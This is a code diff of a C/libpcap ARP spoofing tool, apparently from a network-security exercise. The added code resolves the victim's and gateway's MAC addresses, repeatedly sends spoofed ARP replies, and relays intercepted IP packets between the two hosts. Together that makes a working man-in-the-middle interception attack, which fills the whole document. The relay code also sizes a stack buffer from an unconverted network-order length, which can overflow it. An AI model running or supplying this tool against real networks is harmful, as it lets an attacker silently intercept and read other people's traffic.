@@ -19,6 +19,8 @@
 #define ETHERTYPE_ARP 0x0806
 #define ETHERTYPE_IP 0x0800
 
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+
 typedef struct ethernet_header{
 	uint8_t dest[6];
 	u_char source[6];
@@ -46,7 +48,11 @@ typedef struct multiple_args_send_arp{
 
 typedef struct multiple_args_relay_ip{
     pcap_t* handle;
-    struct in_addr sender_ip; 
+    struct in_addr sender_ip;
+    struct in_addr target_ip;
+    u_char target_mac[6]; 
+    u_char my_mac[6];
+    u_char sender_mac[6];
 } MULTI_ARGS_RELAY;
 
 void usage(){
@@ -73,7 +79,7 @@ void assign_ether(char *host_mac, ETHER_HDR *eth, char *desti_mac){
         }
     }
     else{
-
+        memcpy(eth->dest, desti_mac, 6);  
     }
     memcpy(eth->source, host_mac, 6);
     eth->type = htons(ETHERTYPE_ARP);
@@ -135,6 +141,7 @@ void *send_arp_as_thread(void *multiple_args){
         memcpy(frame,multi_args->eth,sizeof(*multi_args->eth));
         memcpy(frame+sizeof(*multi_args->eth),multi_args->arph,sizeof(*multi_args->arph));
 
+        pthread_mutex_lock(&mutex);
         if (pcap_sendpacket(multi_args->handle, frame, frame_length) != 0)
         {
             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(multi_args->handle));
@@ -142,6 +149,7 @@ void *send_arp_as_thread(void *multiple_args){
             exit(0);
         }        
         
+        printf("#####Sending ARP Spoofing Packet#####\n");
         for (int i=0; i<frame_length; i++){
             if(i==16 || i==32){
                 printf("\n");
@@ -149,6 +157,7 @@ void *send_arp_as_thread(void *multiple_args){
             printf("%.2x",frame[i]);
         }
         printf("\n");
+        pthread_mutex_unlock(&mutex);
         sleep(1);
     }
 }
@@ -157,8 +166,14 @@ void *relay_ip_as_thread(void *multiple_args){
     //receive and relay packets
     MULTI_ARGS_RELAY *multi_args = (MULTI_ARGS_RELAY *)multiple_args;
     pcap_t *handle = multi_args->handle;
+    //sender_ip = 1st parameter that user inputs.
     in_addr sender_ip = multi_args->sender_ip;
-
+    in_addr target_ip = multi_args->target_ip;
+    u_char target_mac[6], my_mac[6], sender_mac[6];
+    memcpy(target_mac,multi_args->target_mac,sizeof(multi_args->target_mac));
+    memcpy(my_mac,multi_args->my_mac,sizeof(multi_args->my_mac));
+    memcpy(sender_mac,multi_args->sender_mac,sizeof(multi_args->sender_mac));
+    //printf("Target_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",multi_args->target_mac[0] , multi_args->target_mac[1] , multi_args->target_mac[2] , multi_args->target_mac[3] , multi_args->target_mac[4] , multi_args->target_mac[5]);
     struct pcap_pkthdr* header;
     const u_char* packet;
 
@@ -177,19 +192,76 @@ void *relay_ip_as_thread(void *multiple_args){
         if(eth_type == ETHERTYPE_IP){
             printf("IP packet captured\n");
             iph_rel = (struct ip*)(packet+14);
-            printf("%u\n",iph_rel->ip_len);
+            //For showing
             char *sender_ip_str = inet_ntoa(sender_ip);
             printf("Sender_IP           : %s\n", sender_ip_str);
             char *source_ip_str = inet_ntoa(*(struct in_addr*)&iph_rel->ip_src);
             printf("Source_IP           : %s\n", source_ip_str);
-          
+            u_short frame_length = sizeof(*eth_rel)+ntohs(iph_rel->ip_len);
+
             if(sender_ip.s_addr == (*(struct in_addr*)&iph_rel->ip_src).s_addr){
-                printf("SAME\nNow I have to figure out target's MAC\n");
+                pthread_mutex_lock(&mutex);
+                printf("Matched with Sender's IP\n");
+                printf("Target_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",target_mac[0] , target_mac[1] , target_mac[2] , target_mac[3] , target_mac[4] , target_mac[5]);
+                
+                memcpy(eth_rel->dest,target_mac,sizeof(target_mac));
+                memcpy(eth_rel->source,my_mac,sizeof(my_mac));
+                u_char frame[iph_rel->ip_len];
+                
+                memset(frame,0,frame_length);
+                memcpy(frame,eth_rel,sizeof(*eth_rel));
+                memcpy(frame+sizeof(*eth_rel),packet+sizeof(*eth_rel),frame_length-sizeof(*eth_rel));
+            
+                if (pcap_sendpacket(handle, frame, frame_length) != 0)
+                {
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(multi_args->handle));
+                    printf("SENDING ERROR!\n");
+                    exit(0);
+                }        
+                
+                printf("#####Relaying Packet Received From Sender#####\n");
+                for (int i=0; i<frame_length; i++){
+                    if(i%16==0){
+                        printf("\n");
+                    }
+                    printf("%.2x",frame[i]);
+                }
+                printf("\n");
+                pthread_mutex_unlock(&mutex);
             }
-         }
+            else if(target_ip.s_addr == (*(struct in_addr*)&iph_rel->ip_src).s_addr){
+                pthread_mutex_lock(&mutex);
+                printf("Matched with Target's IP\n");
+                printf("Sender_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",sender_mac[0] , sender_mac[1] , sender_mac[2] , sender_mac[3] , sender_mac[4] , sender_mac[5]);
+                
+                memcpy(eth_rel->dest,sender_mac,sizeof(sender_mac));
+                memcpy(eth_rel->source,my_mac,sizeof(my_mac));
+                u_char frame[iph_rel->ip_len];
+
+                memset(frame,0,frame_length);
+                memcpy(frame,eth_rel,sizeof(*eth_rel));
+                memcpy(frame+sizeof(*eth_rel),packet+sizeof(*eth_rel),frame_length-sizeof(*eth_rel));
+
+                if (pcap_sendpacket(handle, frame, frame_length) != 0)
+                {
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(multi_args->handle));
+                    printf("SENDING ERROR!\n");
+                    exit(0);
+                }        
+                
+                printf("#####Relaying Packet Received From Target#####\n");
+                for (int i=0; i<frame_length; i++){
+                    if(i%16==0){
+                        printf("\n");
+                    }
+                    printf("%.2x",frame[i]);
+                }
+                printf("\n");
+                pthread_mutex_unlock(&mutex);
+            }
+        }
 
         printf("\n");
-        sleep(1);
     }
 }
 
@@ -236,21 +308,20 @@ int main(int argc, char* argv[]) {
     }
     if (ifAddrStruct!=NULL) freeifaddrs(ifAddrStruct);
 
+    //get my MAC
+    char host_mac[6];
+    GetMyMac(dev,(u_char*)host_mac);
+    
+    //get MAC address of sender
     u_char sender_mac[6];
 
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet;
         
-        //DO NOT CHEAT IT !!     
-    	//Ethernet header - mac src, dst : 6bytes
-        
         ETHER_HDR eth;
         ARP_HDR arph;
-        char host_mac[6];
 
-
-        GetMyMac(dev,(u_char*)host_mac);
 
         assign_ether(host_mac, &eth, "");
         assign_arp(host_mac, &eth, &arph, &sender_ip, "", &myip);   
@@ -283,16 +354,58 @@ int main(int argc, char* argv[]) {
         }  
     }
     printf("Sender_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",sender_mac[0] , sender_mac[1] , sender_mac[2] , sender_mac[3] , sender_mac[4] , sender_mac[5]);
+
+    /**********************************************************************************/
+    //get MAC Address of target
+    u_char target_mac[6];
+
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        
+        ETHER_HDR eth;
+        ARP_HDR arph;
+
+        assign_ether(host_mac, &eth, "");
+        assign_arp(host_mac, &eth, &arph, &target_ip, "", &myip);   
+        
+        send_arp(&eth, &arph, handle);
+
+        //Receive reply
+        ETHER_HDR *eth_rep;
+        ARP_HDR *arph_rep;
+
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+      
+        eth_rep = (ETHER_HDR*)packet;
+        uint16_t eth_type = ntohs(eth_rep->type);
+        printf("%.4X\n",eth_type);
+        
+        //Verify a type of reply
+        if(eth_type == ETHERTYPE_ARP){
+            arph_rep = (ARP_HDR*)(packet+14);
+            if(arph_rep->opcode==htons(0x0002)){
+                memcpy(target_mac, arph_rep->source_mac, 6);
+                break;
+            }
+        }
+        else{
+            sleep(1);    
+            continue;
+        }  
+    }
+    printf("Target_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",target_mac[0] , target_mac[1] , target_mac[2] , target_mac[3] , target_mac[4] , target_mac[5]); 
     
     /**********************************************************************************/
     //send spoofing frames (ARP Reply)
     
     ETHER_HDR eth;
     ARP_HDR arph;
-    char host_mac[6];
-    GetMyMac(dev,(u_char*)host_mac);
 
     assign_ether(host_mac, &eth, (char*)sender_mac);
+    //printf("Sender_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",eth.dest[0] , eth.dest[1] , eth.dest[2] , eth.dest[3] , eth.dest[4] , eth.dest[5]);
     assign_arp(host_mac, &eth, &arph, &sender_ip, (char*)sender_mac, &target_ip);   
     printf("IP : %s\n",inet_ntoa(arph.source_ip));
 
@@ -306,14 +419,21 @@ int main(int argc, char* argv[]) {
 
     multiple_args_relay.handle = handle;
     multiple_args_relay.sender_ip = sender_ip;
-    
+    multiple_args_relay.target_ip = target_ip;
+    memcpy(multiple_args_relay.target_mac,target_mac,sizeof(target_mac));
+    memcpy(multiple_args_relay.my_mac,host_mac,sizeof(host_mac));
+    memcpy(multiple_args_relay.sender_mac,sender_mac,sizeof(sender_mac));
+    //printf("Target_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",multiple_args_relay.target_mac[0] , multiple_args_relay.target_mac[1] , multiple_args_relay.target_mac[2] , multiple_args_relay.target_mac[3] , multiple_args_relay.target_mac[4] , multiple_args_relay.target_mac[5]); 
+
     int statusSend, statusRelay;
     
     pthread_create(&threadSendID, NULL, send_arp_as_thread, (void *) &multiple_args_send);
     pthread_create(&threadRelayID, NULL, relay_ip_as_thread, (void *) &multiple_args_relay);
-
+    
     pthread_join(threadSendID, (void **)&statusSend);
     pthread_join(threadRelayID, (void **)&statusRelay);       
+
+    /****************************************************************************/
 
     pcap_close(handle);
     
